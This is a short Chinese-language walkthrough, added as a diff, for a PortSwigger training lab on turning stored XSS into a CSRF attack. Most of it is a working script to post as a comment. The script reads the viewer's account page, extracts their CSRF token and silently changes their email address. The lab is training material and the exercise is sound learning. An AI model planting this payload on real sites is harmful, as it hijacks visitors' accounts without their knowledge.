@@ -1,0 +1,30 @@
+靶场地址: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
+
+###
+进入靶场,在这个靶场的评论区发送这些
+<script>
+fetch('/my-account')
+  .then(response => response.text())
+  .then(html => {
+    // 1. 从当前查看者的账户页中提取其 csrf Token
+    const csrf = html.match(/name="csrf" value="([^"]+)"/)[1];
+
+    // 2. 构造与 Burp 中相同格式的 POST 正文
+    const body =
+      'email=' + encodeURIComponent('xss-practice-0917-b@example.com') +
+      '&csrf=' + encodeURIComponent(csrf);
+
+    // 3. 以当前查看者的会话发送修改邮箱请求
+    return fetch('/my-account/change-email', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: body
+    });
+  })
+  .then(response => {
+    alert('请求已发送，状态码：' + response.status);
+  });
+</script>
+这些语法,会在后面的JS课程中,详细解释
